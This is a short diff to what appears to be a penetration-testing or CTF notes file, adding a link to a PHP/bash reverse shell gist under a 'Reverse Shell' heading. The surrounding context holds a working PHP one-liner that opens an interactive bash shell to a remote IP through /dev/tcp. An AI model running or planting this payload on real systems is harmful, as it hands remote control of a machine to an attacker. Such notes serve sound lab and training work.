@@ -29,6 +29,7 @@ sudo openvpn --config ./Desktop/yufujioka.ovpn
 
 ### Reverse Shell
 
+- [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc#gistcomment-3100663)
 ```php
 <?php
 exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
